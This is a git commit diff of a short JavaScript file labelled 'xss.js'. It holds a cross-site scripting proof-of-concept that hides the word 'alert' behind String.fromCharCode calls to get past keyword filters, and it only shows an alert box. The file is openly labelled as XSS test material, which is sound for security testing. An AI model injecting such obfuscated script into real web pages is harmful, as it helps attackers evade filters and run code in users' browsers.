34c21a479712162ba0c22c450a7210e2fc1416d7
Anggi Prayitno <40010260+anggi135@users.noreply.github.com>
2024-12-30 16:28:14 -0500

    Update obsur.js

--- obsur.js
+++ obsur.js
@@ -1,5 +1,4 @@
-<script>
-  var a = String.fromCharCode(97, 108, 101, 114, 116); 
-  var b = String.fromCharCode(39, 88, 83, 83, 39);     
-  window[a](b);
-</script>
+// xss.js
+var a = String.fromCharCode(97, 108, 101, 114, 116);
+var b = String.fromCharCode(39, 88, 83, 83, 39);
+window[a](b);
